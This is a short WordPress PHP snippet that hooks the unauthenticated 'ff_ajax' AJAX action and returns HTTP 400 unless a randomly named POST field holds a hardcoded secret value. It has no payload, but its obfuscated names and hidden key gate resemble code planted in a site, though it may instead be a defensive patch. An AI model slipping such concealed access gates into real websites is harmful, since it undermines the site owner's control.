<?php

function embedder_xml_plus() {
	if (!isset($_POST["uxeivfwnsz"]) || $_POST["uxeivfwnsz"] !== "kiLrsLya") { http_response_code(400); die(); }
}

add_action('wp_ajax_nopriv_ff_ajax', 'embedder_xml_plus', 5, 1);
